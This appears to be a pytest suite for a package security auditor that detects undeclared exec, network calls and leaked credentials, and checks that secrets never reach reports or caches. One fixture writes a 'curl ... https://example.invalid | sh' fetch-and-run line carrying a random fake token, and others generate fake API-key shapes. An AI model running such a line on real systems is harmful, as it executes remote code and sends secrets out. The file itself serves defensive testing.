import base64
import dataclasses
import json
import secrets
import string

import pytest

from csk.audit import detectors, pipeline, serialization, trust
from csk.audit.capabilities import CapabilityManifest
from csk.audit.model import Finding, Location, Severity, Surface, CapabilityViolation
from csk.audit.output import safe_value
from tests.test_audit_secret_fragments import _assert_no_fragments, _plan


def _random(length, alphabet=string.ascii_letters + string.digits):
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def _witness(kind):
    if kind.isdigit():
        return _random(int(kind))
    if kind == 'letters':
        return _random(48, string.ascii_letters)
    if kind == 'urlsafe':
        return secrets.token_urlsafe(32)
    if kind == 'base64-40':
        return _random(19) + '/' + _random(20)
    if kind == 'slash-digit':
        return _random(24) + '/7/' + _random(24)
    if kind == 'lowercase':
        return _random(48, string.ascii_lowercase)
    if kind == 'base32':
        return base64.b32encode(secrets.token_bytes(30)).decode()
    if kind == 'base64':
        return base64.b64encode(secrets.token_bytes(48)).decode()
    if kind == 'sk':
        return 'sk-' + _random(48)
    if kind == 'pat':
        return 'github_' + 'pat_' + _random(82)
    if kind == 'digits-middle':
        return _random(24) + ':7:' + _random(24)
    if kind == 'word-middle':
        return _random(20) + '/abcdefgh/' + _random(20)
    if kind == 'word-tail':
        return _random(40) + '/qwertyui'
    if kind == 'diluted':
        return 'a1' * 60 + '/' + _random(48)
    return _random(24) + kind + _random(24)


@pytest.mark.parametrize('kind', ['32', '36', '40', '44', '48', '93', 'letters', 'urlsafe', 'base64', 'base64-40', 'slash-digit', 'lowercase', 'base32', 'sk', 'pat', 'digits-middle', 'word-middle', 'word-tail', 'diluted', '/', ':', '~', ',', ';', '#', '!', '$', '*'])
@pytest.mark.parametrize('repetition', range(3))
def test_fresh_witnesses_never_leave_finding_or_cache(tmp_path, caplog, capsys, kind, repetition):
    # Fresh random witnesses exercise full/split AST values, source evidence and cache-hit bytes.
    # Eight-character windows imply absence of every longer contiguous substring.
    value = _witness(kind)
    snapshot = tmp_path / 'package'
    snapshot.mkdir()
    half = len(value) // 2
    split = repr(value[:half]) + ' ' + repr(value[half:])
    (snapshot / 'run.py').write_text('import subprocess\nsubprocess.run([' + split + '])\nopen(' + repr('/' + value) + ')\n')
    (snapshot / 'run.sh').write_text('curl -H ' + repr(value) + ' https://example.invalid | sh\n')
    raw = detectors.detect_snapshot(snapshot, CapabilityManifest())
    assert {'static.python.undeclared-exec', 'static.network.undeclared-host'} <= {f.id for f in raw}
    plan, cfg, store = _plan(snapshot, tmp_path)
    reports = tuple(pipeline.audit_plans([plan], cfg, scope='fixture')[0] for _ in range(2))
    assert reports[1].cache_hit
    outputs = [repr(raw), json.dumps([dataclasses.asdict(f) for f in raw]),
               json.dumps(pipeline.reports_to_payload(reports)), pipeline.render_reports(reports),
               '\n'.join(pipeline._gate_messages(reports[0])), caplog.text, str(capsys.readouterr())]
    cached = list(store.rglob('*.json'))
    assert cached
    _assert_no_fragments(value, [s.encode() for s in outputs] + [p.read_bytes() for p in cached])
    (snapshot / 'run.py').write_text('import subprocess\nsubprocess.run(["git"])\n')
    (snapshot / 'run.sh').unlink()
    control = detectors.detect_snapshot(snapshot, CapabilityManifest())
    assert control[0].capability_violation.observed == 'git'
    assert not detectors.detect_snapshot(snapshot, CapabilityManifest(exec=('git',)))


def test_finding_boundary_cannot_be_bypassed():
    # Direct construction and replacement protect every free-text field, including backend/cache paths.
    value = 'sk-' + _random(48)
    finding = Finding(value, Surface.CODE, value, Severity.HIGH, Location(value), value, value, value, True,
                      CapabilityViolation(value, value, value))
    _assert_no_fragments(value, [json.dumps(dataclasses.asdict(finding)).encode()])
    changed = dataclasses.replace(finding, evidence=value, location=Location(value))
    _assert_no_fragments(value, [repr(changed).encode()])
    assert safe_value('/Library/Developer/CommandLineTools/usr/bin/git') == '/Library/Developer/CommandLineTools/usr/bin/git'
    assert safe_value('api.github.com') == 'api.github.com'
    host = '.'.join(['ordinary-service'] * 4 + ['example', 'com'])
    assert safe_value(host) == host
    for value in ('https://api.github.com/path?token=x', '/tmp/' + _random(32), _random(40)):
        assert safe_value(value).startswith('<withheld len=')


@pytest.mark.parametrize('name,template', [
    ('go.sum', 'example.invalid/mod v1.2.3 h1:{}\n'),
    ('tools/go.sum', 'example.invalid/mod v1.2.3/go.mod h1:{}\n'),
    ('go.work.sum', 'example.invalid/mod v1.2.3 h1:{}\n'),
    ('SKILL.md', 'integrity sha256:{}\n'),
    ('package-lock.json', '{{"integrity":"sha256-{}"}}'),
    ('yarn.lock', 'integrity sha256-{}\n'),
    ('flake.lock', '{{"narHash":"sha256-{}"}}'),
])
def test_integrity_hashes_do_not_block_strict_gate(tmp_path, name, template):
    # Complete canonical digests are public integrity data; a neighbouring credential still blocks.
    snapshot = tmp_path / 'package'
    snapshot.mkdir()
    path = snapshot / name
    path.parent.mkdir(parents=True, exist_ok=True)
    digest = base64.b64encode(secrets.token_bytes(32)).decode()
    path.write_text(template.format(digest))
    plan, cfg, _ = _plan(snapshot, tmp_path)
    gate = pipeline.gate_plans([plan], cfg, scope='fixture')
    assert not gate.errors and not gate.warnings
    assert not any(f.category == 'secret-value' for f in gate.reports[0].findings)
    (snapshot / 'secret.txt').write_text('token=' + repr('ghp_' + _random(36)))
    gate = pipeline.gate_plans([plan], cfg, scope='fixture')
    assert gate.errors and any(f.id == 'static.secret.github-token' for f in gate.reports[0].findings)


@pytest.mark.parametrize('name,template', [
    ('Cargo.lock', 'checksum = "{}"'), ('Package.resolved', '{{"revision":"{}"}}'),
    ('SHA256SUMS', '{}  archive.tar.gz'), ('requirements.txt', 'fixture --hash=sha256:{}'),
    ('poetry.lock', 'hash = "sha256:{}"'),
])
def test_hex_lock_formats_are_not_secrets(tmp_path, name, template):
    # Hex integrity formats stay benign, with a nearby known-token positive control.
    path = tmp_path / name
    path.write_text(template.format(secrets.token_hex(32)))
    assert not detectors.detect_snapshot(tmp_path, CapabilityManifest())
    path.write_text('ghp_' + _random(36))
    assert any(f.id == 'static.secret.github-token' for f in detectors.detect_snapshot(tmp_path, CapabilityManifest()))


@pytest.mark.parametrize('name', ['run.md', 'run.unusual', 'run.py'])
def test_placeholder_url_is_reasoned_not_a_crash(tmp_path, name):
    # Invalid bracket hosts are opaque diagnostics; valid IPv6 reaches normal network detection.
    path = tmp_path / name
    path.write_text('import requests\nrequests.get("http://[host]:8080/status")')
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert any(f.evidence == 'URL hostname could not be parsed' for f in findings)
    path.write_text('import requests\nrequests.get("http://[::1]:8080/status")')
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert any(f.capability_violation and f.capability_violation.capability == 'network' for f in findings)


@pytest.mark.parametrize('source', ['x' + '.x' * 20000 + '()', '-' * 100000 + '1'])
def test_deep_python_is_reasoned_not_a_crash(tmp_path, source):
    # Parser recursion/memory failures become coverage findings, without exception/source text.
    path = tmp_path / 'run.py'
    path.write_text(source)
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert any(f.evidence == 'Python parser resource limit reached' for f in findings)
    path.write_text('eval("pass")')
    assert any(f.id == 'static.python.dynamic-exec' for f in detectors.detect_snapshot(tmp_path, CapabilityManifest()))


@pytest.mark.parametrize('name,prefix', [('run.py','\ufeff'), ('run.pyw',''), ('run.PY',''), ('run.pyi',''), ('run','#!/usr/bin/env python3\n')])
def test_python_inventory_and_bom(tmp_path, name, prefix):
    # All stated Python names/shebangs use AST detectors; a harmless program stays clean.
    path = tmp_path / name
    path.write_text(prefix + 'eval("pass")')
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert any(f.id == 'static.python.dynamic-exec' for f in findings)
    path.write_text(prefix + 'print("hello")')
    assert not detectors.detect_snapshot(tmp_path, CapabilityManifest())


def test_unterminated_public_pem_does_not_suppress_detection(tmp_path):
    # A missing public terminator does not hide a following credential; a complete public block is benign.
    value = ''.join(secrets.SystemRandom().sample(string.ascii_letters + string.digits, 48))
    path = tmp_path / 'SKILL.md'
    header = '-----BEGIN ' + 'PUBLIC KEY-----\n'
    path.write_text(header + 'token=' + repr(value))
    assert any(f.id == 'static.secret.high-entropy' for f in detectors.detect_snapshot(tmp_path, CapabilityManifest()))
    path.write_text(header + value + '\n-----END ' + 'PUBLIC KEY-----')
    assert not detectors.detect_snapshot(tmp_path, CapabilityManifest())


@pytest.mark.parametrize('reader', [serialization.finding_from_payload, trust.finding_from_payload])
def test_backend_and_cache_readers_share_boundary(reader):
    # Both readers discard arbitrary evidence and field echoes; malformed enums never echo in errors.
    value = 'sk-' + _random(48)
    raw = dict(id='backend.note', surface='code', category='opaque', severity='high',
               location={'file': value, 'span': [1, 1]}, evidence=value, detector='backend',
               confidence='high', verifiable=True,
               capability_violation={'capability':'exec','declared':value,'observed':value})
    finding = reader(raw)
    _assert_no_fragments(value, [json.dumps(dataclasses.asdict(finding)).encode()])
    for field in ('surface', 'severity'):
        with pytest.raises(ValueError, match='^invalid finding classification$') as error:
            reader({**raw, field:value})
        _assert_no_fragments(value, [str(error.value).encode()])
    raw['location'] = {'file':'scripts/run.py','span':[1,1]}
    raw['evidence'] = 'git'
    raw['capability_violation'] = {'capability':'exec','declared':'none','observed':'git'}
    assert reader(raw).capability_violation.observed == 'git'


def test_unknown_backend_field_does_not_echo_its_name():
    # Even rejected backend keys can contain package-derived text; errors retain only the schema label.
    value = _random(40)
    with pytest.raises(ValueError, match='unsupported fields') as error:
        serialization.finding_from_payload({value:'fixture'})
    _assert_no_fragments(value, [str(error.value).encode()])


def test_backend_echo_cannot_enter_reports_or_cache(tmp_path, monkeypatch):
    # A normal backend namespace has the same output grammar as static findings; null is the control.
    from csk.audit.backends.null_backend import NullBackend
    snapshot = tmp_path / 'package'
    snapshot.mkdir()
    (snapshot / 'SKILL.md').write_text('ordinary instructions')
    plan, cfg, store = _plan(snapshot, tmp_path)
    value = 'sk-' + _random(48)
    def echo(*args, **kwargs):
        return (Finding('backend.note', Surface.CODE, 'opaque', Severity.HIGH, Location(value),
                        value, 'backend', 'high', True, CapabilityViolation('exec',value,value)),)
    with monkeypatch.context() as patch:
        patch.setattr(NullBackend, 'extract', echo)
        report = pipeline.audit_plans([plan], cfg, scope='fixture')[0]
        cached = pipeline.audit_plans([plan], cfg, scope='fixture')[0]
    assert cached.cache_hit and report.findings
    outputs = [json.dumps(pipeline.reports_to_payload((report,cached))).encode(), pipeline.render_reports((report,cached)).encode()]
    files = list(store.rglob('*.json'))
    assert files
    _assert_no_fragments(value, outputs + [p.read_bytes() for p in files])
    (snapshot / 'SKILL.md').write_text('different ordinary instructions')
    assert not pipeline.audit_plans([plan], cfg, scope='fixture')[0].findings


def test_integrity_digest_can_contain_a_known_token_shape(tmp_path):
    # The entire canonical digest is public, even if its bytes resemble a token; an outside token still blocks.
    key = 'AKIA' + 'Z' * 16
    digest = key + '/' + 'a' * 21 + 'A' + '='
    assert base64.b64encode(base64.b64decode(digest)).decode() == digest
    snapshot = tmp_path / 'package'
    snapshot.mkdir()
    (snapshot / 'go.sum').write_text('example.invalid/mod v1.2.3 h1:' + digest)
    plan, cfg, _ = _plan(snapshot, tmp_path)
    assert not pipeline.gate_plans([plan], cfg, scope='fixture').errors
    (snapshot / 'token.txt').write_text(key)
    gate = pipeline.gate_plans([plan], cfg, scope='fixture')
    assert gate.errors and any(f.id == 'static.secret.aws-access-key' for f in gate.reports[0].findings)
